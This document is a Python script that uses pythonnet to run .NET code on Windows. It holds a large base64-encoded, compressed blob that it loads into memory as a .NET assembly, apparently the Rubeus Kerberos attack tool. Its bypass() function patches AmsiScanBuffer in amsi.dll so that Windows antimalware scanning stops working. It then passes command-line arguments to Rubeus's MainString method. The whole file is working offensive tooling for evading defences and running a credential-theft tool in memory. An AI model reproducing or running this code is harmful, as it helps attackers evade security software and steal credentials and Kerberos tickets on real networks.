import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()